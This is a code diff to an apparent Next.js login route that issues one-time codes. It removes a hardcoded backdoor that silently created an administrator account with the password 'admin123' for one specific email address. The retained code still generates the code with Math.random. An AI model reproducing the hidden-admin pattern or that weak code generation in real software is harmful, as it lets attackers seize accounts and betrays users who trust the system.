@@ -16,27 +16,15 @@ export async function POST(req: Request) {
 
     const normalizedEmail = email.trim().toLowerCase();
 
-    let user = await prisma.user.findUnique({
+    const user = await prisma.user.findUnique({
       where: { email: normalizedEmail },
     });
 
     if (!user) {
-      if (normalizedEmail === "webstrixx@gmail.com") {
-
-        user = await prisma.user.create({
-          data: {
-            email: "webstrixx@gmail.com",
-            fullName: "Admin",
-            password: hashPassword("admin123"),
-            selectedRole: "admin",
-          },
-        });
-      } else {
-        return NextResponse.json(
-          { error: "No user found with this email address" },
-          { status: 404 }
-        );
-      }
+      return NextResponse.json(
+        { error: "No user found with this email address" },
+        { status: 404 }
+      );
     }
 
     const otpCode = Math.floor(100000 + Math.random() * 900000).toString();
